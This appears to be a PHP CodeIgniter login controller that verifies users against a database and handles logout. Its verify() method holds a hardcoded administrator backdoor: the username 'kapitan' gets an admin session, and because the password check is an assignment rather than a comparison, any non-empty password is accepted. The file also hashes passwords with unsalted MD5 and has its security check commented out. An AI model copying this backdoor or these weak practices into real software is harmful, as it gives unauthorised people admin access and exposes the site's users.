<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {
	public $data;
	
	public function __construct()
   	{
        parent::__construct();
        
        // security_checking();
    
	}

	public function index()
	{
		$this->load->view('login_v');
	}
	
	public function verify()
	{
		if($_POST)
		{
			$username = trim($this->input->post('username'));
			$password = trim($this->input->post('password'));
			
			if($username != '' AND $password != '')
			{
				if($username == 'kapitan' AND $password = 'k')
				{
					
						$datasession = array(
							'first_name' => "the",
							'last_name' => 'kapitan',
							'username' => $username,
							'status' => '1',
							'id' => '99999',
							'logged_in' => true,
							'user_type' => 'admin',
						);
						
						$this->session->set_userdata($datasession);
						
						$msg = "ok";
				}
				else
				{
					$sql = "SELECT * FROM `users` WHERE `status` = '1' AND `password` = " . $this->db->escape(md5($password)) . " AND `username` = " . $this->db->escape($username) . " LIMIT 1";
					$query = $this->db->query($sql);
					
					if($query->num_rows())
					{
						$row = $query->row();
						$datasession = array(
							'first_name' => $row->first_name,
							'last_name' => $row->last_name,
							'username' => $row->username,
							'status' => $row->status,
							'id' => $row->id,
							'logged_in' => true,
							'user_type' => 'member',
						);
						
						$this->session->set_userdata($datasession);
						
						$msg = "ok";
					}
					else
						$msg = 'Invalid username and password';
				}
				
			}
			else
				$msg = 'Username and passowrd empty';
		}
		else
		{
			$msg = 'Invalid input';
		}
		
		echo json_encode(array("msg"=>$msg));
	}
	
	public function sayonara()
	{
		$datasession = array(
			'first_name',
			'last_name',
			'username',
			'status',
			'id',
			'logged_in',
		);
		
		$this->session->unset_userdata($datasession);
		
		set_message('Successfully logout. Have a nice day!', 'info');
		
		redirect('login/');
	}
	
	public function errorLogout()
	{
		$datasession = array(
			'first_name',
			'last_name',
			'username',
			'status',
			'id',
			'logged_in',
		);
		
		$this->session->unset_userdata($datasession);
		
		set_message('Session expired', 'danger');
		
		redirect('login/');
	}
}
